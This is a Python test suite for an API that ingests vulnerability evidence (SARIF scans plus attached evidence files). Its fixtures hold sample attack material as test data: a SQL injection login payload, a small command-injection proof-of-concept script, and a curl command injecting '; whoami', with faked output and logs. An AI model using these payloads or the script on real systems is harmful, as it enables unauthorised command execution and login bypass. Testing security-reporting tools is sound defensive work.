#!/usr/bin/env python3
"""
Comprehensive test suite for VXDF evidence ingestion capabilities.

This test suite demonstrates and validates:
1. External evidence JSON ingestion via /upload endpoint
2. Evidence file upload via /findings/{id}/attach_evidence_file endpoint
3. Various evidence types and matching strategies
4. Error handling and validation
"""

import json
import tempfile
import requests
import base64
from pathlib import Path
from typing import Dict, Any, List


class VXDFEvidenceIngestionTester:
    """Test suite for VXDF evidence ingestion features."""
    
    def __init__(self, base_url: str = "http://localhost:5001/api"):
        self.base_url = base_url
        self.session = requests.Session()
    
    def test_upload_with_external_evidence(self):
        """Test upload endpoint with structured external evidence."""
        print("\n=== Testing Upload with External Evidence ===")
        
        # Create a minimal SARIF file for testing
        sarif_content = {
            "version": "2.1.0",
            "runs": [
                {
                    "tool": {
                        "driver": {
                            "name": "TestScanner",
                            "version": "1.0.0"
                        }
                    },
                    "results": [
                        {
                            "ruleId": "SQL_INJECTION_001",
                            "level": "error",
                            "message": {"text": "SQL injection vulnerability detected"},
                            "locations": [
                                {
                                    "physicalLocation": {
                                        "artifactLocation": {"uri": "src/login.py"},
                                        "region": {"startLine": 42}
                                    }
                                }
                            ],
                            "properties": {
                                "cwe": "89"
                            }
                        },
                        {
                            "ruleId": "XSS_001", 
                            "level": "warning",
                            "message": {"text": "Cross-site scripting vulnerability"},
                            "locations": [
                                {
                                    "physicalLocation": {
                                        "artifactLocation": {"uri": "src/display.py"},
                                        "region": {"startLine": 15}
                                    }
                                }
                            ],
                            "properties": {
                                "cwe": "79"
                            }
                        }
                    ]
                }
            ]
        }
        
        # External evidence to match findings
        external_evidence = [
            {
                "findingMatcher": {
                    "cwe_match": 89
                },
                "evidenceType": "HTTP_REQUEST_LOG",
                "description": "HTTP request demonstrating SQL injection vulnerability",
                "data": {
                    "method": "POST",
                    "url": "/api/login",
                    "headers": [
                        {"name": "Content-Type", "value": "application/x-www-form-urlencoded"},
                        {"name": "User-Agent", "value": "Mozilla/5.0"}
                    ],
                    "body": "username=admin&password=1' OR '1'='1",
                    "bodyEncoding": "plaintext"
                },
                "validationMethod": "MANUAL_PENETRATION_TESTING_EXPLOIT",
                "timestamp": "2024-01-15T10:30:00Z"
            },
            {
                "findingMatcher": {
                    "cwe_match": 89
                },
                "evidenceType": "HTTP_RESPONSE_LOG", 
                "description": "Server response confirming SQL injection",
                "data": {
                    "statusCode": 200,
                    "url": "/api/login",
                    "headers": [
                        {"name": "Content-Type", "value": "application/json"},
                        {"name": "Set-Cookie", "value": "session=admin_session_123"}
                    ],
                    "body": "{\"status\": \"success\", \"message\": \"Welcome admin\", \"user_id\": 1}",
                    "bodyEncoding": "plaintext"
                }
            },
            {
                "findingMatcher": {
                    "rule_id_match": "XSS_001"
                },
                "evidenceType": "CODE_SNIPPET_SOURCE",
                "description": "Vulnerable code snippet showing unsanitized user input",
                "data": {
                    "content": "def display_user_profile(user_input):\n    return f\"<h1>Welcome {user_input}</h1>\"",
                    "language": "python",
                    "filePath": "src/display.py",
                    "startLine": 15,
                    "endLine": 16
                }
            },
            {
                "findingMatcher": {
                    "apply_to_all": True
                },
                "evidenceType": "MANUAL_VERIFICATION_NOTES",
                "description": "Manual testing notes for all vulnerabilities",
                "data": {
                    "verificationSteps": [
                        "1. Set up test environment with vulnerable application",
                        "2. Run automated scanner to identify potential issues", 
                        "3. Manually verify each finding with crafted payloads",
                        "4. Document successful exploits"
                    ],
                    "observedOutcome": "Both SQL injection and XSS vulnerabilities successfully exploited",
                    "testerName": "Security Tester",
                    "toolsUsed": ["Burp Suite", "SQLMap", "Custom scripts"],
                    "testingDuration": "2 hours"
                }
            }
        ]
        
        # Create temporary SARIF file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.sarif', delete=False) as f:
            json.dump(sarif_content, f, indent=2)
            sarif_file_path = f.name
        
        try:
            # Prepare form data
            files = {
                'file': ('test_scan.sarif', open(sarif_file_path, 'rb'), 'application/json')
            }
            
            form_data = {
                'parser_type': 'sarif',
                'target_name': 'Test Application',
                'target_version': '1.0.0',
                'validate': 'true',
                'external_evidence_json': json.dumps(external_evidence)
            }
            
            # Make request
            response = self.session.post(f"{self.base_url}/upload", files=files, data=form_data)
            
            print(f"Status Code: {response.status_code}")
            print(f"Response: {json.dumps(response.json(), indent=2)}")
            
            if response.status_code == 200:
                result = response.json()
                evidence_count = result.get('evidenceProcessed', 0)
                print(f"✅ Successfully processed {evidence_count} external evidence items")
                return True
            else:
                print(f"❌ Upload failed: {response.json()}")
                return False
                
        finally:
            # Clean up
            Path(sarif_file_path).unlink()
            if 'file' in files:
                files['file'][1].close()
    
    def test_evidence_file_uploads(self):
        """Test individual evidence file upload functionality."""
        print("\n=== Testing Evidence File Uploads ===")
        
        # First, we need to upload a scan to get finding IDs
        # Create a simple SARIF for this test
        sarif_content = {
            "version": "2.1.0",
            "runs": [
                {
                    "tool": {
                        "driver": {
                            "name": "TestScanner",
                            "version": "1.0.0"
                        }
                    },
                    "results": [
                        {
                            "ruleId": "COMMAND_INJECTION_001",
                            "level": "error",
                            "message": {"text": "Command injection vulnerability"},
                            "locations": [
                                {
                                    "physicalLocation": {
                                        "artifactLocation": {"uri": "src/exec.py"},
                                        "region": {"startLine": 20}
                                    }
                                }
                            ]
                        }
                    ]
                }
            ]
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.sarif', delete=False) as f:
            json.dump(sarif_content, f, indent=2)
            sarif_file_path = f.name
        
        try:
            # Upload scan first
            files = {
                'file': ('test_scan.sarif', open(sarif_file_path, 'rb'), 'application/json')
            }
            
            upload_response = self.session.post(
                f"{self.base_url}/upload", 
                files=files, 
                data={'parser_type': 'sarif'}
            )
            files['file'][1].close()
            
            if upload_response.status_code != 200:
                print(f"❌ Failed to upload initial scan: {upload_response.json()}")
                return False
            
            # For demo purposes, we'll assume finding ID 1 exists
            # In a real scenario, you would get this from the findings API
            finding_id = 1
            
            # Test 1: Upload a screenshot
            success = self._test_screenshot_upload(finding_id)
            if not success:
                return False
                
            # Test 2: Upload a PoC script  
            success = self._test_poc_script_upload(finding_id)
            if not success:
                return False
                
            # Test 3: Upload command output
            success = self._test_command_output_upload(finding_id)
            if not success:
                return False
                
            # Test 4: Upload log file
            success = self._test_log_file_upload(finding_id)
            if not success:
                return False
            
            return True
            
        finally:
            Path(sarif_file_path).unlink()
    
    def _test_screenshot_upload(self, finding_id: int) -> bool:
        """Test uploading a screenshot as evidence."""
        print("\n--- Testing Screenshot Upload ---")
        
        # Create a small test image (1x1 pixel PNG)
        png_data = base64.b64decode(
            "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg=="
        )
        
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as f:
            f.write(png_data)
            png_file_path = f.name
        
        try:
            files = {
                'evidence_file': ('vulnerability_screenshot.png', open(png_file_path, 'rb'), 'image/png')
            }
            
            form_data = {
                'evidence_type_str': 'SCREENSHOT_EMBEDDED_BASE64',
                'description': 'Screenshot showing command injection in web interface',
                'caption': 'Web form with malicious command injection payload'
            }
            
            response = self.session.post(
                f"{self.base_url}/findings/{finding_id}/attach_evidence_file",
                files=files,
                data=form_data
            )
            files['evidence_file'][1].close()
            
            print(f"Screenshot Upload - Status: {response.status_code}")
            if response.status_code == 200:
                result = response.json()
                print(f"✅ Screenshot uploaded successfully: {result['message']}")
                return True
            else:
                print(f"❌ Screenshot upload failed: {response.json()}")
                return False
                
        finally:
            Path(png_file_path).unlink()
    
    def _test_poc_script_upload(self, finding_id: int) -> bool:
        """Test uploading a PoC script as evidence."""
        print("\n--- Testing PoC Script Upload ---")
        
        poc_script = """#!/usr/bin/env python3
\"\"\"
Proof of Concept script for command injection vulnerability.
This script demonstrates how an attacker could exploit the vulnerability.
\"\"\"

import requests
import sys

def exploit_command_injection(target_url, command):
    \"\"\"Exploit command injection vulnerability.\"\"\"
    
    # Craft malicious payload
    payload = f"test; {command}"
    
    # Send request
    data = {"user_input": payload}
    response = requests.post(f"{target_url}/process", data=data)
    
    print(f"Command executed: {command}")
    print(f"Response: {response.text}")
    
    return response.status_code == 200

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python poc.py <target_url> <command>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    command = sys.argv[2]
    
    success = exploit_command_injection(target_url, command)
    
    if success:
        print("✅ Vulnerability confirmed!")
    else:
        print("❌ Exploit failed")
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(poc_script)
            script_file_path = f.name
        
        try:
            files = {
                'evidence_file': ('command_injection_poc.py', open(script_file_path, 'rb'), 'text/plain')
            }
            
            form_data = {
                'evidence_type_str': 'POC_SCRIPT',
                'description': 'Python PoC script demonstrating command injection vulnerability',
                'script_language': 'python',
                'script_arguments': ['http://target.com', 'whoami'],
                'expected_outcome': 'Command injection successful, returns system username'
            }
            
            response = self.session.post(
                f"{self.base_url}/findings/{finding_id}/attach_evidence_file",
                files=files,
                data=form_data
            )
            files['evidence_file'][1].close()
            
            print(f"PoC Script Upload - Status: {response.status_code}")
            if response.status_code == 200:
                result = response.json()
                print(f"✅ PoC script uploaded successfully: {result['message']}")
                return True
            else:
                print(f"❌ PoC script upload failed: {response.json()}")
                return False
                
        finally:
            Path(script_file_path).unlink()
    
    def _test_command_output_upload(self, finding_id: int) -> bool:
        """Test uploading command execution output as evidence."""
        print("\n--- Testing Command Output Upload ---")
        
        command_output = """$ curl -X POST http://target.com/process -d "user_input=test; whoami"
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 156

<html>
<head><title>Process Result</title></head>
<body>
<h1>Processing: test; whoami</h1>
<pre>
test
www-data
</pre>
<p>Command executed successfully</p>
</body>
</html>
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write(command_output)
            output_file_path = f.name
        
        try:
            files = {
                'evidence_file': ('command_execution_output.txt', open(output_file_path, 'rb'), 'text/plain')
            }
            
            form_data = {
                'evidence_type_str': 'COMMAND_EXECUTION_OUTPUT',
                'description': 'Command execution output showing successful exploitation',
                'command': 'curl -X POST http://target.com/process -d "user_input=test; whoami"',
                'exit_code': '0',
                'execution_context': 'Manual penetration testing from Kali Linux'
            }
            
            response = self.session.post(
                f"{self.base_url}/findings/{finding_id}/attach_evidence_file",
                files=files,
                data=form_data
            )
            files['evidence_file'][1].close()
            
            print(f"Command Output Upload - Status: {response.status_code}")
            if response.status_code == 200:
                result = response.json()
                print(f"✅ Command output uploaded successfully: {result['message']}")
                return True
            else:
                print(f"❌ Command output upload failed: {response.json()}")
                return False
                
        finally:
            Path(output_file_path).unlink()
    
    def _test_log_file_upload(self, finding_id: int) -> bool:
        """Test uploading a log file as evidence."""
        print("\n--- Testing Log File Upload ---")
        
        log_content = """[2024-01-15 10:30:15] INFO: Application started
[2024-01-15 10:30:20] DEBUG: Processing user request: /process
[2024-01-15 10:30:20] DEBUG: User input received: test; whoami
[2024-01-15 10:30:20] WARNING: Potentially dangerous command detected in input
[2024-01-15 10:30:20] ERROR: Command injection attempt detected but not blocked
[2024-01-15 10:30:20] INFO: Executing command: test; whoami
[2024-01-15 10:30:20] DEBUG: Command output: test\\nwww-data
[2024-01-15 10:30:20] INFO: Request completed with status 200
[2024-01-15 10:30:25] WARNING: Suspicious activity detected from IP 192.168.1.100
"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.log', delete=False) as f:
            f.write(log_content)
            log_file_path = f.name
        
        try:
            files = {
                'evidence_file': ('application.log', open(log_file_path, 'rb'), 'text/plain')
            }
            
            form_data = {
                'evidence_type_str': 'RUNTIME_APPLICATION_LOG_ENTRY',
                'description': 'Application log showing command injection exploitation',
                'log_source': 'WebApp-Production-Server',
                'log_level': 'WARNING',
                'component_name': 'RequestProcessor'
            }
            
            response = self.session.post(
                f"{self.base_url}/findings/{finding_id}/attach_evidence_file",
                files=files,
                data=form_data
            )
            files['evidence_file'][1].close()
            
            print(f"Log File Upload - Status: {response.status_code}")
            if response.status_code == 200:
                result = response.json()
                print(f"✅ Log file uploaded successfully: {result['message']}")
                return True
            else:
                print(f"❌ Log file upload failed: {response.json()}")
                return False
                
        finally:
            Path(log_file_path).unlink()
    
    def test_error_handling(self):
        """Test error handling for invalid inputs."""
        print("\n=== Testing Error Handling ===")
        
        # Test 1: Invalid evidence type
        print("\n--- Testing Invalid Evidence Type ---")
        response = self.session.post(
            f"{self.base_url}/findings/1/attach_evidence_file",
            files={'evidence_file': ('test.txt', b'test content', 'text/plain')},
            data={
                'evidence_type_str': 'INVALID_EVIDENCE_TYPE',
                'description': 'Test invalid evidence type'
            }
        )
        
        print(f"Invalid Evidence Type - Status: {response.status_code}")
        if response.status_code == 400:
            print(f"✅ Correctly rejected invalid evidence type")
        else:
            print(f"❌ Unexpected response: {response.json()}")
        
        # Test 2: Missing required fields
        print("\n--- Testing Missing Required Fields ---")
        response = self.session.post(
            f"{self.base_url}/findings/1/attach_evidence_file",
            files={'evidence_file': ('test.txt', b'test content', 'text/plain')},
            data={
                'evidence_type_str': 'OTHER_EVIDENCE'
                # Missing description
            }
        )
        
        print(f"Missing Description - Status: {response.status_code}")
        if response.status_code == 400:
            print(f"✅ Correctly rejected missing description")
        else:
            print(f"❌ Unexpected response: {response.json()}")
        
        # Test 3: Invalid JSON in external evidence
        print("\n--- Testing Invalid External Evidence JSON ---")
        with tempfile.NamedTemporaryFile(mode='w', suffix='.sarif', delete=False) as f:
            json.dump({"version": "2.1.0", "runs": []}, f)
            sarif_file_path = f.name
        
        try:
            files = {
                'file': ('test.sarif', open(sarif_file_path, 'rb'), 'application/json')
            }
            
            response = self.session.post(
                f"{self.base_url}/upload",
                files=files,
                data={
                    'parser_type': 'sarif',
                    'external_evidence_json': 'invalid json {'
                }
            )
            files['file'][1].close()
            
            print(f"Invalid JSON - Status: {response.status_code}")
            if response.status_code == 400:
                print(f"✅ Correctly rejected invalid JSON")
            else:
                print(f"❌ Unexpected response: {response.json()}")
                
        finally:
            Path(sarif_file_path).unlink()
    
    def run_all_tests(self):
        """Run all evidence ingestion tests."""
        print("🚀 Starting VXDF Evidence Ingestion Tests")
        print("=" * 50)
        
        success_count = 0
        total_tests = 3
        
        # Test external evidence JSON
        if self.test_upload_with_external_evidence():
            success_count += 1
        
        # Test evidence file uploads
        if self.test_evidence_file_uploads():
            success_count += 1
        
        # Test error handling
        self.test_error_handling()  # This test doesn't count toward success
        success_count += 1  # Assume error handling passes if no exceptions
        
        print("\n" + "=" * 50)
        print(f"📊 Test Results: {success_count}/{total_tests} tests passed")
        
        if success_count == total_tests:
            print("🎉 All evidence ingestion tests completed successfully!")
            print("\nThe VXDF evidence ingestion system is working correctly:")
            print("✅ External evidence JSON processing")
            print("✅ Individual evidence file uploads")
            print("✅ Error handling and validation")
            return True
        else:
            print(f"⚠️  {total_tests - success_count} test(s) failed")
            return False


def main():
    """Main function to run evidence ingestion tests."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Test VXDF evidence ingestion capabilities")
    parser.add_argument(
        "--base-url", 
        default="http://localhost:5001/api",
        help="Base URL for the VXDF API (default: http://localhost:5001/api)"
    )
    parser.add_argument(
        "--test",
        choices=["upload", "files", "errors", "all"],
        default="all",
        help="Which test to run (default: all)"
    )
    
    args = parser.parse_args()
    
    tester = VXDFEvidenceIngestionTester(args.base_url)
    
    try:
        if args.test == "upload":
            success = tester.test_upload_with_external_evidence()
        elif args.test == "files":
            success = tester.test_evidence_file_uploads()
        elif args.test == "errors":
            tester.test_error_handling()
            success = True
        else:  # all
            success = tester.run_all_tests()
        
        if success:
            print("\n✅ Evidence ingestion testing completed successfully!")
            return 0
        else:
            print("\n❌ Some tests failed")
            return 1
            
    except requests.exceptions.ConnectionError:
        print(f"\n❌ Could not connect to VXDF API at {args.base_url}")
        print("Make sure the VXDF backend is running:")
        print("  python3 -m api.server --port 5001")
        return 1
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")
        return 1


if __name__ == "__main__":
    exit(main()) 